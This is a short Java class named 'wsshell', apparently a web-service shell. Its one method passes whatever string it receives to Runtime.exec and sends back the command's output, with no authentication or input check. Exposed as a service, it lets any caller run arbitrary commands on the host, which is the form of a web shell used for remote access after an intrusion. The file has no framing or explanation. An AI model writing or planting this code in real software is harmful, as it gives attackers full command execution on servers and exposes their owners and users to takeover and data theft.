public class wsshell {

	public String execute(String value) {
		
	try {	
        java.lang.Runtime rt = java.lang.Runtime.getRuntime();
        java.lang.Process p = rt.exec(value);
        p.waitFor();
        java.io.InputStream is = p.getInputStream();
        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(is));
        String s = null;
		String o = "";
        while ((s = reader.readLine()) != null) {
        	o+=s + "\n";
	}
        is.close();
		
	return o;
	} catch (java.lang.Exception e) {
	return e.getMessage();
	}
    }
}
